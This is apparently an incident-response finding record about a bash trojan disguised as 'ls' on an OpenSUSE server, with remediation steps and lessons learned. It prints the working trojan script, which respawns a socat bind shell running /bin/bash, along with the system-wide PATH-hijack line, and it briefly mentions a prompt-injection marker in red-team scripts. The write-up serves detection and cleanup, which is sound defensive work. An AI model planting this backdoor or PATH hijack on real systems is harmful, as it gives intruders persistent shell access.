# F017 — /usr/local/bin/ls Bash Trojan (Socat Respawner)

- **Severity:** CRITICAL
- **VM:** Task Server (OpenSUSE)
- **Status:** ✅ RESOLVED
- **Discovered:** 2026-11-13
- **Resolved:** 2026-11-14 00:49 UTC

## Summary
A bash trojan masquerading as the `ls` command was planted at TWO locations, both in a PATH that preceded `/usr/bin`. Every invocation of `ls` (including by scripts, cron, and administrators) first checked whether the socat backdoor on port 45926 was running. If not, it respawned the backdoor via `mkfs.azfs` (F003) before exec'ing the real `/usr/bin/ls`. This was the mechanism that kept F003 alive despite repeated cleanup.

## Evidence

### Location 1: `/usr/local/bin/ls` (standard PATH)
```bash
#!/bin/bash
if ! (echo > /dev/tcp/localhost/45926) 2>/dev/null; then
	mkfs.azfs TCP-LISTEN:45926,fork EXEC:/bin/bash &
fi
exec /usr/bin/ls "$@"
```

### Location 2: `/usr/local/var/log/ls` (hidden via custom PATH)
Identical contents. PATH injection delivered via `/etc/profile.d/00-custom.sh`:
```
export PATH=/usr/local/var/log:$PATH
```
File birth date 2026-08-28, indicating long-standing persistence.

### Also removed: `/usr/local/bin/plc-helper`
Contained only `exit 0`, suspicious naming suggesting placeholder for future payload.

## Impact
Every single `ls` command on the system — including those run by automated tools, cron jobs, and our own investigation — silently respawned the socat bind shell on port 45926. This is why F003 appeared to keep coming back no matter how many times we killed the listener and removed the mkfs.azfs symlink. The second copy at `/usr/local/var/log/ls` was particularly stealthy because it required knowledge of the custom profile.d PATH modification to find.

## Remediation Actions Taken
- 2026-11-14 ~00:30: Deleted `/usr/local/bin/ls` (first trojan)
- 2026-11-14 ~00:30: Deleted `/usr/local/bin/plc-helper` (suspicious placeholder)
- 2026-11-14 ~00:49: Discovered second copy at `/usr/local/var/log/ls` (found via `which ls` after fresh login)
- 2026-11-14 ~00:49: Removed PATH hijack: `rm /etc/profile.d/00-custom.sh`
- 2026-11-14 ~00:49: Deleted second trojan: `rm /usr/local/var/log/ls`
- 2026-11-14 ~00:49: Removed non-standard directory structure: `rmdir /usr/local/var/log /usr/local/var/run /usr/local/var`
- 2026-11-14 ~00:50: Verified only `/usr/bin/ls` remains on entire filesystem
- 2026-11-14 ~00:50: Verified port 45926 not listening
- 2026-11-14 ~00:59: Archived evidence to `/root/ir-evidence/2026-11-13-opensuse-remediation/`

## Verification
- `which ls` → `/usr/bin/ls` ✅
- `find / -xdev -name ls -type f` → only `/usr/bin/ls` ✅
- `ss -tlnp | grep 45926` → empty ✅
- `grep -r "PATH.*local/var" /etc/profile*` → no matches ✅

## Lesson Learned
The custom PATH prepend in `/etc/profile.d/00-custom.sh` was a far more elegant persistence mechanism than typical PATH hijacking (which usually modifies user `.bashrc` files). By placing the hijack at the system-wide profile level, it affected every shell for every user without touching any home directory. Future investigations should always check:
1. `/etc/profile.d/` for PATH modifications
2. `/etc/environment`
3. Full `echo $PATH` as root to spot non-standard entries
4. Birth/modify dates on files in PATH directories (not just the obvious ones)

## Notes
- Related to F003 (socat bind shell) — F017 was the respawn mechanism keeping F003 alive
- Prompt injection marker "CHRONO-7" was found in related Red Team scripts
- Evidence archived at `/root/ir-evidence/2026-11-13-opensuse-remediation/F017b-path-hijack-profile.sh`
